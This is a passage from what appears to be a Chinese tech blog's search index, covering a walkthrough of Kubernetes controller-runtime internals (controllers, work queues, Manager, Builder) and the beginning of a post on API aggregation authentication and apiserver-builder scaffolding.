...predicate.Predicate) error // 启动controller，类似于自定义的Run() Start(ctx context.Context) error GetLogger() logr.Logger } controller structure 在 controller-runtime\\pkg\\internal\\controller\\controller.go 中实现了这个 Controller\ntype Controller struct { Name string // controller的标识 MaxConcurrentReconciles int // 并发运行Reconciler的数量，默认1 // 实现了reconcile.Reconciler的调节器， 默认DefaultReconcileFunc Do reconcile.Reconciler // makeQueue会构建一个对应的队列，就是返回一个限速队列 MakeQueue func() workqueue.RateLimitingInterface // MakeQueue创造出来的，在出入队列就是操作的这个 Queue workqueue.RateLimitingInterface // 用于注入其他内容 // 已弃用 SetFields func(i interface{}) error mu sync.Mutex // 标识开始的状态 Started bool // 在启动时传递的上下文，用于停止控制器 ctx context.Context // 等待缓存同步的时间 默认2分钟 CacheSyncTimeout time.Duration // 维护了eventHandler predicates，在控制器启动时启动 startWatches []watchDescription // 日志构建器，输出入日志 LogConstructor func(request *reconcile.Request) logr.Logger // RecoverPanic为是否对reconcile引起的panic恢复 RecoverPanic bool } 看完了controller的structure，接下来看看controller是如何使用的\ninjection Controller.Watch 实现了注入的动作，可以看到 watch() 通过参数将 对应的事件函数传入到内部\nfunc (c *Controller) Watch(src source.Source, evthdler handler.EventHandler, prct ...predicate.Predicate) error { c.mu.Lock() defer c.mu.Unlock() // 使用SetFields来完成注入操作 if err := c.SetFields(src); err != nil { return err } if err := c.SetFields(evthdler); err != nil { return err } for _, pr := range prct { if err := c.SetFields(pr); err != nil { return err } } // 如果Controller还未启动，那么将这些动作缓存到本地 if !c.Started { c.startWatches = append(c.startWatches, watchDescription{src: src, handler: evthdler, predicates: prct}) return nil } c.LogConstructor(nil).Info(\u0026quot;Starting EventSource\u0026quot;, \u0026quot;source\u0026quot;, src) return src.Start(c.ctx, evthdler, c.Queue, prct...) } 启动操作实际上为informer注入事件函数\ntype Source interface { // start 是Controller 调用，用以向 Informer 注册 EventHandler， 将 reconcile.Requests（一个入队列的动作） 排入队列。 Start(context.Context, handler.EventHandler, workqueue.RateLimitingInterface, ...predicate.Predicate) error } func (is *Informer) Start(ctx context.Context, handler handler.EventHandler, queue workqueue.RateLimitingInterface, prct ...predicate.Predicate) error { // Informer should have been specified by the user. if is.Informer == nil { return fmt.Errorf(\u0026quot;must specify Informer.Informer\u0026quot;) } is.Informer.AddEventHandler(internal.EventHandler{Queue: queue, EventHandler: handler, Predicates: prct}) return nil } 我们知道对于 eventHandler，实际上应该是一个 onAdd，onUpdate 这种类型的函数，queue则是workqueue，那么 Predicates 是什么呢？\n通过追踪可以看到定义了 Predicate 抽象，可以看出Predicate 是Watch到的事件时什么类型的，当对于每个类型的事件，对应的函数就为 true，在 eventHandler 中，这些被用作，事件的过滤。\n// Predicate filters events before enqueuing the keys. type Predicate interface { // Create returns true if the Create event should be processed Create(event.CreateEvent) bool // Delete returns true if the Delete event should be processed Delete(event.DeleteEvent) bool // Update returns true if the Update event should be processed Update(event.UpdateEvent) bool // Generic returns true if the Generic event should be processed Generic(event.GenericEvent) bool } 在对应的动作中，可以看到这里作为过滤操作\nfunc (e EventHandler) OnAdd(obj interface{}) { c := event.CreateEvent{} // Pull Object out of the object if o, ok := obj.(client.Object); ok { c.Object = o } else { log.Error(nil, \u0026quot;OnAdd missing Object\u0026quot;, \u0026quot;object\u0026quot;, obj, \u0026quot;type\u0026quot;, fmt.Sprintf(\u0026quot;%T\u0026quot;, obj)) return } for _, p := range e.Predicates { if !p.Create(c) { return } } // Invoke create handler e.EventHandler.Create(c, e.Queue) } 上面就看到了，对应是 EventHandler.Create 进行添加的，那么这些动作具体是在做什么呢？\n在代码 pkg/handler ,可以看到这些操作，类似于create，这里将ns/name放入到队列中。\nfunc (e *EnqueueRequestForObject) Create(evt event.CreateEvent, q workqueue.RateLimitingInterface) { if evt.Object == nil { enqueueLog.Error(nil, \u0026quot;CreateEvent received with no metadata\u0026quot;, \u0026quot;event\u0026quot;, evt) return } q.Add(reconcile.Request{NamespacedName: types.NamespacedName{ Name: evt.Object.GetName(), Namespace: evt.Object.GetNamespace(), }}) } unqueue 上面看到了，入队的动作实际上都是将 ns/name 加入到队列中，那么出队列时又做了些什么呢？\n通过 controller.Start() 可以看到controller在启动后都做了些什么动作\nfunc (c *Controller) Start(ctx context.Context) error { c.mu.Lock() if c.Started { return errors.New(\u0026quot;controller was started more than once. This is likely to be caused by being added to a manager multiple times\u0026quot;) } c.initMetrics() // Set the internal context. c.ctx = ctx c.Queue = c.MakeQueue() // 初始化queue go func() { // 退出时，让queue关闭 \u0026lt;-ctx.Done() c.Queue.ShutDown() }() wg := \u0026amp;sync.WaitGroup{} err := func() error { defer c.mu.Unlock() defer utilruntime.HandleCrash() // 启动informer前，将之前准备好的 evnetHandle predictates source注册 for _, watch := range c.startWatches { c.LogConstructor(nil).Info(\u0026quot;Starting EventSource\u0026quot;, \u0026quot;source\u0026quot;, fmt.Sprintf(\u0026quot;%s\u0026quot;, watch.src)) // 上面我们看过了，start就是真正的注册动作 if err := watch.src.Start(ctx, watch.handler, c.Queue, watch.predicates...); err != nil { return err } } // Start the SharedIndexInformer factories to begin populating the SharedIndexInformer caches c.LogConstructor(nil).Info(\u0026quot;Starting Controller\u0026quot;) // startWatches上面我们也看到了，是evnetHandle predictates source被缓存到里面， // 这里是拿出来将其启动 for _, watch := range c.startWatches { syncingSource, ok := watch.src.(source.SyncingSource) if !ok { continue } if err := func() error { // use a context with timeout for launching sources and syncing caches. sourceStartCtx, cancel := context.WithTimeout(ctx, c.CacheSyncTimeout) defer cancel() // WaitForSync waits for a definitive timeout, and returns if there // is an error or a timeout if err := syncingSource.WaitForSync(sourceStartCtx); err != nil { err := fmt.Errorf(\u0026quot;failed to wait for %s caches to sync: %w\u0026quot;, c.Name, err) c.LogConstructor(nil).Error(err, \u0026quot;Could not wait for Cache to sync\u0026quot;) return err } return nil }(); err != nil { return err } } // which won't be garbage collected if we hold a reference to it. c.startWatches = nil // Launch workers to process resources c.LogConstructor(nil).Info(\u0026quot;Starting workers\u0026quot;, \u0026quot;worker count\u0026quot;, c.MaxConcurrentReconciles) wg.Add(c.MaxConcurrentReconciles) // 启动controller消费端的线程 for i := 0; i \u0026lt; c.MaxConcurrentReconciles; i++ { go func() { defer wg.Done() for c.processNextWorkItem(ctx) { } }() } c.Started = true return nil }() if err != nil { return err } \u0026lt;-ctx.Done() // 阻塞，直到上下文关闭 c.LogConstructor(nil).Info(\u0026quot;Shutdown signal received, waiting for all workers to finish\u0026quot;) wg.Wait() // 等待所有线程都关闭 c.LogConstructor(nil).Info(\u0026quot;All workers finished\u0026quot;) return nil } 通过上面的分析，可以看到，每个消费的worker线程，实际上调用的是 processNextWorkItem 下面就来看看他究竟做了些什么？\nfunc (c *Controller) processNextWorkItem(ctx context.Context) bool { obj, shutdown := c.Queue.Get() // 从队列中拿取数据 if shutdown { return false } defer c.Queue.Done(obj) // 下面应该是prometheus指标的一些东西 ctrlmetrics.ActiveWorkers.WithLabelValues(c.Name).Add(1) defer ctrlmetrics.ActiveWorkers.WithLabelValues(c.Name).Add(-1) // 获得的对象通过reconcileHandler处理 c.reconcileHandler(ctx, obj) return true } 那么下面看看 reconcileHandler 做了些什么\nfunc (c *Controller) reconcileHandler(ctx context.Context, obj interface{}) { // Update metrics after processing each item reconcileStartTS := time.Now() defer func() { c.updateMetrics(time.Since(reconcileStartTS)) }() // 检查下取出的数据是否为reconcile.Request，在之前enqueue时了解到是插入的这个类型的值 req, ok := obj.(reconcile.Request) if !ok { // 如果错了就忘记 c.Queue.Forget(obj) c.LogConstructor(nil).Error(nil, \u0026quot;Queue item was not a Request\u0026quot;, \u0026quot;type\u0026quot;, fmt.Sprintf(\u0026quot;%T\u0026quot;, obj), \u0026quot;value\u0026quot;, obj) return } log := c.LogConstructor(\u0026amp;req) log = log.WithValues(\u0026quot;reconcileID\u0026quot;, uuid.NewUUID()) ctx = logf.IntoContext(ctx, log) // 这里调用了自己在实现controller实现的Reconcile的动作 result, err := c.Reconcile(ctx, req) switch { case err != nil: c.Queue.AddRateLimited(req) ctrlmetrics.ReconcileErrors.WithLabelValues(c.Name).Inc() ctrlmetrics.ReconcileTotal.WithLabelValues(c.Name, labelError).Inc() log.Error(err, \u0026quot;Reconciler error\u0026quot;) case result.RequeueAfter \u0026gt; 0: c.Queue.Forget(obj) c.Queue.AddAfter(req, result.RequeueAfter) ctrlmetrics.ReconcileTotal.WithLabelValues(c.Name, labelRequeueAfter).Inc() case result.Requeue: c.Queue.AddRateLimited(req) ctrlmetrics.ReconcileTotal.WithLabelValues(c.Name, labelRequeue).Inc() default: c.Queue.Forget(obj) ctrlmetrics.ReconcileTotal.WithLabelValues(c.Name, labelSuccess).Inc() } } 通过对example中的 Reconcile 查找其使用，可以看到，调用他的就是上面我们说道的 reconcileHandler ，到这里我们就知道了，controller 的运行流为 Controller.Start() \u0026gt; Controller.processNextWorkItem \u0026gt; Controller.reconcileHandler \u0026gt; Controller.Reconcile 最终到达了我们自定义的业务逻辑处理 Reconcile\nManager 在上面学习 controller-runtime 时了解到，有一个 Manager 的组件，这个组件是做什么呢？我们来分析下。\nManager 是用来创建与启动 controller 的（允许多个 controller 与 一个 manager 关联），Manager会启动分配给他的所有controller，以及其他可启动的对象。\n在 example 看到，会初始化一个 ctrl.NewManager\nfunc main() { ctrl.SetLogger(zap.New()) mgr, err := ctrl.NewManager(ctrl.GetConfigOrDie(), ctrl.Options{}) if err != nil { setupLog.Error(err, \u0026quot;unable to start manager\u0026quot;) os.Exit(1) } // in a real controller, we'd create a new scheme for this err = api.AddToScheme(mgr.GetScheme()) if err != nil { setupLog.Error(err, \u0026quot;unable to add scheme\u0026quot;) os.Exit(1) } err = ctrl.NewControllerManagedBy(mgr). For(\u0026amp;api.ChaosPod{}). Owns(\u0026amp;corev1.Pod{}). Complete(\u0026amp;reconciler{ Client: mgr.GetClient(), scheme: mgr.GetScheme(), }) if err != nil { setupLog.Error(err, \u0026quot;unable to create controller\u0026quot;) os.Exit(1) } err = ctrl.NewWebhookManagedBy(mgr). For(\u0026amp;api.ChaosPod{}). Complete() if err != nil { setupLog.Error(err, \u0026quot;unable to create webhook\u0026quot;) os.Exit(1) } setupLog.Info(\u0026quot;starting manager\u0026quot;) if err := mgr.Start(ctrl.SetupSignalHandler()); err != nil { setupLog.Error(err, \u0026quot;problem running manager\u0026quot;) os.Exit(1) } } 这个 manager 就是 controller-runtime\\pkg\\manager\\manager.go 下的 Manager， Manager 通过初始化 Caches 和 Clients 等共享依赖，并将它们提供给 Runnables。\ntype Manager interface { // 提供了与APIServer交互的方式，如incluster，indexer，cache等 cluster.Cluster // Runnable 是任意可允许的cm中的组件，如 webhook，controller，Caches，在new中调用时， // 可以看到是传入的是一个controller，这里可以启动的是带有Start()方法的，通过调用Start() // 来启动组件 Add(Runnable) error // 实现选举方法。当elected关闭，则选举为leader Elected() \u0026lt;-chan struct{} // 这为一些列健康检查和指标的方法，和我们关注的没有太大关系 AddMetricsExtraHandler(path string, handler http.Handler) error AddHealthzCheck(name string, check healthz.Checker) error AddReadyzCheck(name string, check healthz.Checker) error // Start将启动所有注册进来的控制器，直到ctx取消。如果有任意controller报错，则立即退出 // 如果使用了 LeaderElection，则必须在此返回后立即退出二进制文件， Start(ctx context.Context) error // GetWebhookServer returns a webhook.Server GetWebhookServer() *webhook.Server // GetLogger returns this manager's logger. GetLogger() logr.Logger // GetControllerOptions returns controller global configuration options. GetControllerOptions() v1alpha1.ControllerConfigurationSpec } controller-manager controllerManager 则实现了这个manager的抽象\ntype controllerManager struct { sync.Mutex started bool stopProcedureEngaged *int64 errChan chan error runnables *runnables cluster cluster.Cluster // recorderProvider 用于记录eventhandler source predictate recorderProvider *intrec.Provider // resourceLock forms the basis for leader election resourceLock resourcelock.Interface // 在退出时是否关闭选举租约 leaderElectionReleaseOnCancel bool // 一些指标性的，暂时不需要关注 metricsListener net.Listener metricsExtraHandlers map[string]http.Handler healthProbeListener net.Listener readinessEndpointName string livenessEndpointName string readyzHandler *healthz.Handler healthzHandler *healthz.Handler // 有关controller全局参数 controllerOptions v1alpha1.ControllerConfigurationSpec logger logr.Logger // 用于关闭 LeaderElection.Run(...) 的信号 leaderElectionStopped chan struct{} // 取消选举，在失去选举后，必须延迟到gracefulShutdown之后os.exit() leaderElectionCancel context.CancelFunc // leader取消选举 elected chan struct{} port int host string certDir string webhookServer *webhook.Server webhookServerOnce sync.Once // 非leader节点强制leader的等待时间 leaseDuration time.Duration // renewDeadline is the duration that the acting controlplane will retry // refreshing leadership before giving up. renewDeadline time.Duration // LeaderElector重新操作的时间 retryPeriod time.Duration // gracefulShutdownTimeout 是在manager停止之前让runnables停止的持续时间。 gracefulShutdownTimeout time.Duration // onStoppedLeading is callled when the leader election lease is lost. // It can be overridden for tests. onStoppedLeading func() shutdownCtx context.Context internalCtx context.Context internalCancel context.CancelFunc internalProceduresStop chan struct{} } workflow 了解完ControllerManager之后，我们通过 example 来看看 ControllerManager 的workflow\nfunc main() { ctrl.SetLogger(zap.New()) // New一个manager mgr, err := ctrl.NewManager(ctrl.GetConfigOrDie(), ctrl.Options{}) if err != nil { setupLog.Error(err, \u0026quot;unable to start manager\u0026quot;) os.Exit(1) } // in a real controller, we'd create a new scheme for this err = api.AddToScheme(mgr.GetScheme()) if err != nil { setupLog.Error(err, \u0026quot;unable to add scheme\u0026quot;) os.Exit(1) } err = ctrl.NewControllerManagedBy(mgr). For(\u0026amp;api.ChaosPod{}). Owns(\u0026amp;corev1.Pod{}). Complete(\u0026amp;reconciler{ Client: mgr.GetClient(), scheme: mgr.GetScheme(), }) if err != nil { setupLog.Error(err, \u0026quot;unable to create controller\u0026quot;) os.Exit(1) } err = ctrl.NewWebhookManagedBy(mgr). For(\u0026amp;api.ChaosPod{}). Complete() if err != nil { setupLog.Error(err, \u0026quot;unable to create webhook\u0026quot;) os.Exit(1) } setupLog.Info(\u0026quot;starting manager\u0026quot;) if err := mgr.Start(ctrl.SetupSignalHandler()); err != nil { setupLog.Error(err, \u0026quot;problem running manager\u0026quot;) os.Exit(1) } } 通过 manager.New() 初始化一个manager，这里面会初始化一些列的manager的参数 通过 ctrl.NewControllerManagedBy 注册 controller 到manager中 ctrl.NewControllerManagedBy 是 builder的一个别名，构建出一个builder类型的controller builder 中的 ctrl 就是 controller 启动manager builder 下面看来看下builder在构建时做了什么\n// Builder builds a Controller. type Builder struct { forInput ForInput ownsInput []OwnsInput watchesInput []WatchesInput mgr manager.Manager globalPredicates []predicate.Predicate ctrl controller.Controller ctrlOptions controller.Options name string } 我们看到 example 中是调用了 For() 动作，那么这个 For() 是什么呢？\n通过注释，我们可以看到 For() 提供了 调解对象类型，ControllerManagedBy 通过 reconciling object 来相应对应create/delete/update 事件。调用 For() 相当于调用了 Watches(\u0026amp;source.Kind{Type: apiType}, \u0026amp;handler.EnqueueRequestForObject{}) 。\nfunc (blder *Builder) For(object client.Object, opts ...ForOption) *Builder { if blder.forInput.object != nil { blder.forInput.err = fmt.Errorf(\u0026quot;For(...) should only be called once, could not assign multiple objects for reconciliation\u0026quot;) return blder } input := ForInput{object: object} for _, opt := range opts { opt.ApplyToFor(\u0026amp;input) //最终把我们要监听的对象每个 opts注册进去 } blder.forInput = input return blder } 接下来是调用的 Owns() ，Owns() 看起来和 For() 功能是类似的。只是说属于不同，是通过Owns方法设置的\nfunc (blder *Builder) Owns(object client.Object, opts ...OwnsOption) *Builder { input := OwnsInput{object: object} for _, opt := range opts { opt.ApplyToOwns(\u0026amp;input) } blder.ownsInput = append(blder.ownsInput, input) return blder } 最后到了 Complete()，Complete 是完成这个controller的构建\n// Complete builds the Application Controller. func (blder *Builder) Complete(r reconcile.Reconciler) error { _, err := blder.Build(r) return err } // Build 创建控制器并返回 func (blder *Builder) Build(r reconcile.Reconciler) (controller.Controller, error) { if r == nil { return nil, fmt.Errorf(\u0026quot;must provide a non-nil Reconciler\u0026quot;) } if blder.mgr == nil { return nil, fmt.Errorf(\u0026quot;must provide a non-nil Manager\u0026quot;) } if blder.forInput.err != nil { return nil, blder.forInput.err } // Checking the reconcile type exist or not if blder.forInput.object == nil { return nil, fmt.Errorf(\u0026quot;must provide an object for reconciliation\u0026quot;) } // Set the ControllerManagedBy if err := blder.doController(r); err != nil { return nil, err } // Set the Watch if err := blder.doWatch(); err != nil { return nil, err } return blder.ctrl, nil } 这里面可以看到，会完成 doController 和 doWatch\ndoController会初始化好这个controller并返回\nfunc (blder *Builder) doController(r reconcile.Reconciler) error { globalOpts := blder.mgr.GetControllerOptions() ctrlOptions := blder.ctrlOptions if ctrlOptions.Reconciler == nil { ctrlOptions.Reconciler = r } // 通过检索GVK获得默认的名称 gvk, err := getGvk(blder.forInput.object, blder.mgr.GetScheme()) if err != nil { return err } // 设置并发，如果最大并发为0则找到一个 // 追踪下去看似是对于没有设置时，例如会根据 app group中的 ReplicaSet设定 // 就是在For()传递的一个类型的数量来确定并发的数量 if ctrlOptions.MaxConcurrentReconciles == 0 { groupKind := gvk.GroupKind().String() if concurrency, ok := globalOpts.GroupKindConcurrency[groupKind]; ok \u0026amp;\u0026amp; concurrency \u0026gt; 0 { ctrlOptions.MaxConcurrentReconciles = concurrency } } // Setup cache sync timeout. if ctrlOptions.CacheSyncTimeout == 0 \u0026amp;\u0026amp; globalOpts.CacheSyncTimeout != nil { ctrlOptions.CacheSyncTimeout = *globalOpts.CacheSyncTimeout } // 给controller一个name，如果没有初始化传递，则使用Kind做名称 controllerName := blder.getControllerName(gvk) // Setup the logger. if ctrlOptions.LogConstructor == nil { log := blder.mgr.GetLogger().WithValues( \u0026quot;controller\u0026quot;, controllerName, \u0026quot;controllerGroup\u0026quot;, gvk.Group, \u0026quot;controllerKind\u0026quot;, gvk.Kind, ) lowerCamelCaseKind := strings.ToLower(gvk.Kind[:1]) + gvk.Kind[1:] ctrlOptions.LogConstructor = func(req *reconcile.Request) logr.Logger { log := log if req != nil { log = log.WithValues( lowerCamelCaseKind, klog.KRef(req.Namespace, req.Name), \u0026quot;namespace\u0026quot;, req.Namespace, \u0026quot;name\u0026quot;, req.Name, ) } return log } } // 这里就是构建一个新的控制器了，也就是前面说到的 manager.New() blder.ctrl, err = newController(controllerName, blder.mgr, ctrlOptions) return err } manager.New()\nstart Manager 接下来是manager的启动，也就是对应的 start() 与 doWatch()\n通过下述代码我们可以看出来，对于 doWatch() 就是把 compete() 前的一些资源的事件函数都注入到controller 中\nfunc (blder *Builder) doWatch() error { // 调解类型，这也也就是对于For的obj来说，我们需要的是什么结构的，如非结构化数据或metadata-only // metadata-only就是配置成一个GVK schema.GroupVersionKind typeForSrc, err := blder.project(blder.forInput.object, blder.forInput.objectProjection) if err != nil { return err }\u0026amp;source.Kind{} // 一些准备工作，将对象封装为\u0026amp;source.Kind{} // src := \u0026amp;source.Kind{Type: typeForSrc} hdler := \u0026amp;handler.EnqueueRequestForObject{} // 就是包含obj的一个事件队列 allPredicates := append(blder.globalPredicates, blder.forInput.predicates...) // 这里又到之前说过的controller watch了 // 将一系列的准备动作注入到cache 如 source eventHandler predicate if err := blder.ctrl.Watch(src, hdler, allPredicates...); err != nil { return err } // 再重复 ownsInput 动作 for _, own := range blder.ownsInput { typeForSrc, err := blder.project(own.object, own.objectProjection) if err != nil { return err } src := \u0026amp;source.Kind{Type: typeForSrc} hdler := \u0026amp;handler.EnqueueRequestForOwner{ OwnerType: blder.forInput.object, IsController: true, } allPredicates := append([]predicate.Predicate(nil), blder.globalPredicates...) allPredicates = append(allPredicates, own.predicates...) if err := blder.ctrl.Watch(src, hdler, allPredicates...); err != nil { return err } } // 在对 ownsInput 进行重复的操作 for _, w := range blder.watchesInput { allPredicates := append([]predicate.Predicate(nil), blder.globalPredicates...) allPredicates = append(allPredicates, w.predicates...) // If the source of this watch is of type *source.Kind, project it. if srckind, ok := w.src.(*source.Kind); ok { typeForSrc, err := blder.project(srckind.Type, w.objectProjection) if err != nil { return err } srckind.Type = typeForSrc } if err := blder.ctrl.Watch(w.src, w.eventhandler, allPredicates...); err != nil { return err } } return nil } 由于前两部 builder 的操作将 mgr 指针传入到 builder中，并且操作了 complete() ，也就是操作了 build() ,这代表了对 controller 完成了初始化，和事件注入（watch）的操作，所以 Start()，就是将controller启动\nfunc (cm *controllerManager) Start(ctx context.Context) (err error) { cm.Lock() if cm.started { cm.Unlock() return errors.New(\u0026quot;manager already started\u0026quot;) } var ready bool defer func() { if !ready { cm.Unlock() } }() // Initialize the internal context. cm.internalCtx, cm.internalCancel = context.WithCancel(ctx) // 这个channel代表了controller的停止 stopComplete := make(chan struct{}) defer close(stopComplete) // This must be deferred after closing stopComplete, otherwise we deadlock. defer func() { stopErr := cm.engageStopProcedure(stopComplete) if stopErr != nil { if err != nil { err = kerrors.NewAggregate([]error{err, stopErr}) } else { err = stopErr } } }() // Add the cluster runnable. if err := cm.add(cm.cluster); err != nil { return fmt.Errorf(\u0026quot;failed to add cluster to runnables: %w\u0026quot;, err) } // 指标类 if cm.metricsListener != nil { cm.serveMetrics() } if cm.healthProbeListener != nil { cm.serveHealthProbes() } if err := cm.runnables.Webhooks.Start(cm.internalCtx); err != nil { if !errors.Is(err, wait.ErrWaitTimeout) { return err } } // 等待informer同步完成 if err := cm.runnables.Caches.Start(cm.internalCtx); err != nil { if !errors.Is(err, wait.ErrWaitTimeout) { return err } } // 非选举模式，runnable将在cache同步完成后启动 if err := cm.runnables.Others.Start(cm.internalCtx); err != nil { if !errors.Is(err, wait.ErrWaitTimeout) { return err } } // Start the leader election and all required runnables. { ctx, cancel := context.WithCancel(context.Background()) cm.leaderElectionCancel = cancel go func() { if cm.resourceLock != nil { if err := cm.startLeaderElection(ctx); err != nil { cm.errChan \u0026lt;- err } } else { // Treat not having leader election enabled the same as being elected. if err := cm.startLeaderElectionRunnables(); err != nil { cm.errChan \u0026lt;- err } close(cm.elected) } }() } ready = true cm.Unlock() select { case \u0026lt;-ctx.Done(): // We are done return nil case err := \u0026lt;-cm.errChan: // Error starting or running a runnable return err } } 可以看到上面启动了4种类型的runnable，实际上就是对这runnable进行启动，例如 controller，cache等。\n回顾一下，我们之前在使用code-generator 生成，并自定义controller时，我们也是通过启动 informer.Start() ，否则会报错。\n最后可以通过一张关系图来表示，client-go与controller-manager之间的关系\nReference\ndiving controller runtime\n","permalink":"https://www.oomkill.com/2022/06/ch15-controller-runtime/","summary":"","title":"源码分析Kubernetes controller组件 - controller-runtime"},{"content":"Overview What is Kubernetes aggregation Kubernetes apiserver aggregation AA 是Kubernetes提供的一种扩展API的方法，目前并没有GA\nDifference between CRD and AA 众所周知，kubernetes扩展API的方法大概为三种：CRD、AA、手动扩展源码。根据CNCF分享中Min Kim说的AA更关注于实践，而用户无需了解底层的原理，这里使用过 kubebuilder， code-generator 的用户是很能体会到这点。官方也给出了CRD与AA的区别\nAPI Access Control Authentication CR: All strategies supported. Configured by root apiserver. AA: Supporting all root apiserver\u0026rsquo;s authenticating strategies but it has to be done via authentication token review api except for authentication proxy which will cause an extra cost of network RTT. Authorization CR: All strategies supported. Configured by root apiserver. AA: Delegating authorization requests to root apiserver via SubjectAccessReview api. Note that this approach will also cost a network RTT. Admission Control CR: You could extend via dynamic admission control webhook (which is costing network RTT). AA: While You can develop and customize your own admission controller which is dedicated to your AA. While You can\u0026rsquo;t reuse root-apiserver\u0026rsquo;s built-in admission controllers nomore. API Schema Note: CR\u0026rsquo;s integration with OpenAPI schema is being enhanced in the future releases and it will have a stronger integration with OpenAPI mechanism.\nValidating CR: (landed in 1.12) Defined via OpenAPIv3 Schema grammar. more AA: You can customize any validating flow you want. Conversion CR: (landed in 1.13) The CR conversioning (basically from storage version to requested version) could be done via conversioning webhook. AA: Develop any conversion you want. SubResource CR: Currently only status and scale sub-resource supported. AA: You can customize any sub-resouce you want. OpenAPI Schema CR: (landed in 1.13) The corresponding CRD\u0026rsquo;s OpenAPI schema will be automatically synced to root-apiserver\u0026rsquo;s openapi doc api. AA: OpenAPI doc has to be manually generated by code-generating tools. Authentication 要想很好的使用AA，就需要对kubernetes与 AA 之间认证机制进行有一定的了解，这里涉及到一些概念\n客户端证书认证 token认证 请求头认证 在下面的说明中，所有出现的APIServer都是指Kubernetes集群组件APIServer也可以为 root APIServer；所有的AA都是指 extension apiserver，就是自行开发的 AA。\n客户端证书 客户端证书就是CA签名的证书，由客户端指定CA证书，在客户端连接时进行身份验证，在Kubernetes APIserver也使用了相同的机制。\n默认情况下，APIServer在启动时指定参数 --client-ca-file ，这时APIServer会创建一个名为 extension-apiserver-authentication ，命名空间为 kube-system 下的 configMap。\n$ kubectl get cm -A NAMESPACE NAME DATA AGE kube-system extension-apiserver-authentication 6 21h kubectl get cm extension-apiserver-authentication -n kube-system -o yaml 由上面的命令可以看出这个configMap将被填充到客户端（AA Pod实例）中，使用此CA证书作为用于验证客户端身份的CA。这样客户端会读取这个configMap，与APIServer进行身份认证。\nI0622 14:24:00.509486 1 secure_serving.go:178] Serving securely on [::]:443 I0622 14:24:00.509556 1 configmap_cafile_content.go:202] Starting client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file token认证 Token认证是指通过HTTP Header传入 Authorization: Bearer $TOKEN 的方式进行客户端认证，这也是Kubernetes集群内认证常用的方法。\n在这种情况下，允许对APIServer进行认证也同样可以对AA进行认证。如果不想 AA 对同一集群进行身份验证，或AA在集群外部运行，可以将参数 --authentication-kubeconfig 以指定要使用的不同 Kubeconfig 认证。\n下面实例是AA的启动参数\n./bin/apiserver -h|grep authentication-kubeconfig --authentication-kubeconfig string kubeconfig file pointing at the 'core' kubernetes server with enough righ ts to create tokenreviews.authentication.k8s.io. This is optional. If empty, all token requests are considered to be anonymous and no cli ent CA is looked up in the cluster. 请求头认证 RequestHeader 认证是指，APIServer对来自AA代理连接进行的身份认证。\n默认情况下，AA 从 extension-apiserver-authentication 中提到的 ConfigMap 中 提取 requestheader 客户端 CA 证书与 CN。如果主 Kubernetes APIServer 配置了选项 --requestheader-client-ca-file ，则它会填充此内容。\n跳过客户端认证 --authentication-skip-lookup\n授权 默认情况下，AA 服务器会通过自动注入到 Kubernetes 集群上运行的 pod 的连接信息和凭据，来连接到主 Kubernetes API 服务器。\nE0622 11:20:12.375512 1 errors.go:77] Post \u0026quot;https://192.168.0.1:443/apis/authorization.k8s.io/v1/subjectaccessreviews\u0026quot;: write tcp 192.168.0.36:39324-\u0026gt;192.168.0.1:443: write: connection reset by peer 如果AA在集群外部部署，可以指定--authorization-kubeconfig 通过kubeconfig进行认证，这就类似于二进制部署中的信息。\n默认情况下，Kubernetes 集群会启用RBAC，这就意味着AA 创建多个clusterrolebinding。\n下面日志是 AA 对于集群中资源访问无权限的情况\nE0622 09:01:26.750320 1 reflector.go:178] pkg/mod/k8s.io/client-go@v0.18.10/tools/cache/reflector.go:125: Failed to list *v1.MutatingWebhookConfiguration: mutatingwebhookconfigurations.admissionregistration.k8s.io is forbidden: User \u0026quot;system:serviceaccount:default:default\u0026quot; cannot list resource \u0026quot;mutatingwebhookconfigurations\u0026quot; in API group \u0026quot;admissionregistration.k8s.io\u0026quot; at the cluster scope E0622 09:01:29.357897 1 reflector.go:178] pkg/mod/k8s.io/client-go@v0.18.10/tools/cache/reflector.go:125: Failed to list *v1.Namespace: namespaces is forbidden: User \u0026quot;system:serviceaccount:default:default\u0026quot; cannot list resource \u0026quot;namespaces\u0026quot; in API group \u0026quot;\u0026quot; at the cluster scope E0622 09:01:39.998496 1 reflector.go:178] pkg/mod/k8s.io/client-go@v0.18.10/tools/cache/reflector.go:125: Failed to list *v1.ValidatingWebhookConfiguration: validatingwebhookconfigurations.admissionregistration.k8s.io is forbidden: User \u0026quot;system:serviceaccount:default:default\u0026quot; cannot list resource \u0026quot;validatingwebhookconfigurations\u0026quot; in API group \u0026quot;admissionregistration.k8s.io\u0026quot; at the cluster scope 需要手动在namespace kube-system 中创建rolebindding到 role extension-apiserver-authentication-reader 。这样就可以访问到configMap了。\napiserver-builder apiserver-builder 项目就是创建AA的工具，可以参考 installing.md 来安装\n初始化项目 初始化命令\n\u0026lt;your-domain\u0026gt; 这个是你的API资源的组，参考 k8s.io/api 如果组的名称是域名就设置为主域名，例如内置组 /apis/authentication.k8s.io /apis/batch 生成的go mod 包名为你所在的目录的名称 例如，在firewalld目录下，go.mod 的名称为 firewalld apiserver-boot init repo --domain \u0026lt;your-domain\u0026gt; 例如\napiserver-boot init repo --domain fedoraproject.org 注：这里\u0026ndash;domain设置为主域名就可以了，后面生成的group会按照格式 +\napiserver-boot must be run from the directory containing the go package to bootstrap. This must be under $GOPATH/src/\u0026lt;package\u0026gt;. 必须在 $GOPATH/src 下创建你的项目，我这里的为 GOPATH=go/src ，这时创建项目必须在目录 go/src/src/{project} 下创建\n创建一个GVK apiserver-boot create group version resource \\ --group firewalld \\ --version v1 \\ --kind PortRule 在创建完成之后会生成 api-like的类型，我们只需要填充自己需要的就可以了\ntype PortRule struct { metav1.TypeMeta `json:\u0026quot;,inline\u0026quot;` metav1.ObjectMeta `json:\u0026quot;metadata,omitempty\u0026quot;` Spec PortRuleSpec `json:\u0026quot;spec,omitempty\u0026quot;` Status PortRuleStatus `json:\u0026quot;status,omitempty\u0026quot;` } // PortRuleSpec defines the desired state of PortRule type PortRuleSpec struct { // 这里内容都为空的，自己添加即可 Name string `json:\u0026quot;name\u0026quot;` Host string `json:\u0026quot;host\u0026quot;` Port int `json:\u0026quot;port\u0026quot;` IsPremanent bool `json:\u0026quot;isPremanent,omitempty\u0026quot;` } // PortRuleStatus defines the observed state of PortRule type PortRuleStatus struct { } 生成代码 apiserver-boot 没有专门用来生成代码的命令，可以执行任意生成命令即可，这里使用生成二进制执行文件命令，这个过程相当长。\napiserver-boot build executables 如果编译错误可以使用 